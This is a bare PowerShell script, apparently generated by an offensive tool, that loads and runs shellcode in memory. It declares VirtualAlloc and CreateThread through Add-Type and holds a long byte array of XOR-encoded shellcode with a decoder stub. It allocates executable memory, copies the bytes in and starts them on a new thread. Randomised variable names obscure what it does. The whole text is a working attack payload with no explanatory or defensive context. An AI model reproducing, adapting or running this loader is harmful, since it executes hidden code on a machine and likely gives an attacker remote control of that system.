$rPqkzWHISU = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$atnpBPvQZRWfvNk = Add-Type -memberDefinition $rPqkzWHISU -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $nCdzIYJCcvUyO = 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x83,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,0x8a,0x6,0x30,0x7,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xe3,0x9e,0x74,0x7,0x80,0x3e,0x83,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,0xff,0x3,0x13,0x83,0xff,0x5b,0x80,0xf7,0xf3,0xfb,0xcf,0x13,0x3,0x13,0x42,0x42,0x42,0x43,0x51,0x5b,0x32,0xc1,0x66,0x5b,0x88,0x41,0x63,0x42,0x55,0x5b,0x88,0x41,0x1b,0x5b,0x88,0x41,0x23,0x5e,0x32,0xda,0x4b,0x1c,0xb4,0x59,0x49,0x5b,0x88,0x61,0x53,0x5b,0x32,0xd3,0xaf,0x2f,0x62,0x6f,0x1,0x3f,0x23,0x52,0xc2,0xda,0xe,0x52,0x2,0xd2,0xe1,0xfe,0x51,0x5b,0x88,0x41,0x23,0x98,0x41,0x2f,0x42,0x42,0x4b,0x12,0xd3,0x75,0x82,0x6b,0x1b,0x18,0x1,0x1c,0x86,0x61,0x3,0x13,0x3,0x98,0x83,0x9b,0x3,0x13,0x3,0x5b,0x86,0xd3,0x77,0x74,0x4b,0x12,0xd3,0x43,0x47,0x98,0x43,0x33,0x4a,0x12,0xd3,0x98,0x4b,0xb,0xe0,0x45,0x4b,0xec,0xca,0x52,0x88,0x27,0x8b,0x5b,0x2,0xc5,0x4e,0x22,0xca,0x5b,0x32,0xd3,0x42,0xd2,0xca,0x1e,0xaf,0x52,0x2,0xd2,0x3b,0xf3,0x76,0xe2,0x4f,0x10,0x4f,0x37,0xb,0x56,0x3a,0xc2,0x76,0xcb,0x5b,0x57,0x88,0x53,0x27,0x5a,0x2,0xc3,0x65,0x52,0x88,0x1f,0x4b,0x57,0x88,0x53,0x1f,0x5a,0x2,0xc3,0x42,0x98,0x7,0x9b,0x4b,0x12,0xd3,0x52,0x5b,0x52,0x5b,0x4d,0x5a,0x49,0x42,0x4b,0x42,0x4a,0x42,0x49,0x4b,0x90,0xef,0x33,0x42,0x41,0xfc,0xf3,0x5b,0x52,0x5a,0x49,0x4b,0x98,0x11,0xfa,0x48,0xec,0xfc,0xec,0x5e,0x5a,0xbd,0x64,0x70,0x21,0x5c,0x20,0x31,0x13,0x3,0x52,0x55,0x5a,0x8a,0xf5,0x4b,0x92,0xef,0xb3,0x2,0x13,0x3,0x5a,0x8a,0xf6,0x4a,0xaf,0x1,0x13,0x2,0xa8,0x21,0xf2,0xa8,0xde,0x42,0x47,0x4a,0x9a,0xe7,0x5f,0x8a,0xe2,0x42,0xa9,0x4f,0x64,0x25,0x14,0xfc,0xc6,0x4f,0x9a,0xe9,0x7b,0x2,0x12,0x3,0x13,0x5a,0x52,0xb9,0x3a,0x83,0x78,0x3,0xec,0xd6,0x79,0x9,0x52,0x5d,0x43,0x53,0x5e,0x32,0xda,0x4e,0x22,0xc3,0x5b,0xfc,0xd3,0x4b,0x9a,0xc1,0x5b,0xfc,0xd3,0x4b,0x9a,0xc2,0x52,0xb9,0xf9,0xc,0xcc,0xe3,0xec,0xd6,0x5b,0x8a,0xd4,0x69,0x3,0x42,0x4b,0x4f,0x9a,0xe1,0x5b,0x8a,0xea,0x42,0xa9,0x9a,0xb6,0x77,0x72,0xfc,0xc6,0x86,0xd3,0x77,0x19,0x4a,0xec,0xcd,0x66,0xe6,0xfb,0x1c,0x12,0x3,0x13,0x4b,0x90,0xef,0x3,0x4b,0x9a,0xe1,0x5e,0x32,0xda,0x69,0x17,0x42,0x4b,0x4b,0x9a,0xfa,0x52,0xb9,0x11,0xda,0xdb,0x5c,0xec,0xd6,0x90,0xfb,0x13,0xc,0x9d,0x6e,0x13,0x3,0x13,0x4b,0x90,0xc7,0x33,0x5d,0x9a,0xf5,0x92,0xf5,0xb3,0x6,0xb1,0xd0,0x5f,0x8e,0x8d,0x3,0x12,0x3,0x13,0x69,0x53,0x42,0x4a,0x6b,0x13,0x13,0x13,0x3,0x52,0x5b,0x5b,0x8a,0xe1,0x4b,0x22,0xca,0x52,0xb9,0x4b,0xa7,0x40,0xe6,0xec,0xd6,0x5b,0x8e,0x8b,0x3,0x12,0x3,0x13,0x4a,0x9a,0xdc,0x40,0x55,0x43,0x4e,0x22,0xca,0x5a,0x8a,0xe3,0x4b,0x9a,0xd9,0x5b,0x8a,0xea,0x42,0xa9,0x1,0xca,0xcb,0x4c,0xfc,0xc6,0x4b,0x90,0xc7,0x33,0x80,0xeb,0x3,0x6e,0x2b,0x4b,0x42,0x44,0x5a,0x7b,0x3,0x53,0x3,0x13,0x42,0x4b,0x69,0x13,0x59,0x52,0xb9,0x18,0x2c,0x1c,0x33,0xec,0xd6,0x44,0x5a,0x52,0xb9,0x66,0x6d,0x5e,0x62,0xec,0xd6,0x5a,0xfc,0xdd,0xea,0x33,0xfc,0xec,0xfc,0x5b,0x2,0xd0,0x4b,0x3a,0xc5,0x66,0xb0,0x5a,0x8a,0xed,0x5c,0x4a,0x42,0x4a,0x42,0x45,0xeb,0x3,0x3,0x13,0x3,0x27,0x29,0x7b,0x7d,0xb1,0xd3,0x40,0x63,0xda,0x50,0x3,0x79,0xd8,0xeb,0x2d,0xb,0x4d,0x4b,0x22,0xc3,0x5a,0x8a,0xeb,0xa9,0xed,0xc3,0x66,0xf8,0x5b,0x32,0xc8,0x42,0x11,0x1f,0x13,0x4b,0x9a,0xc1,0x93,0xe1,0x1c,0x1,0xf,0x15,0x52,0x89,0x7,0x3,0x52,0x85,0x7,0x1b,0x52,0x8b,0x7,0x3,0xed,0xc3,0x66,0xe0,0x5b,0x32,0xc8,0xfd,0xd3,0x42,0x11,0x1f,0x13,0x42,0x99,0x17,0x13,0x42,0x95,0x17,0xb,0x42,0x9b,0x17,0x13,0x42,0x11,0x17,0xb,0x42,0x99,0x17,0x3,0x42,0x23,0x12,0x5a,0xfc,0xd2,0x4b,0xec,0xca,0x66,0xd8,0x4c,0x42,0xec,0xe4,0x4b,0x69,0x13,0x5a,0x5a,0xc4,0xd1,0xf3,0xa6,0xa1,0x45,0xfc,0xc6,0xe3,0x9e


$xrICbBIjNEdExT = $atnpBPvQZRWfvNk::VirtualAlloc(0,[Math]::Max($nCdzIYJCcvUyO.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($nCdzIYJCcvUyO,0,$xrICbBIjNEdExT,$nCdzIYJCcvUyO.Length)

$atnpBPvQZRWfvNk::CreateThread(0,0,$xrICbBIjNEdExT,0,0,0)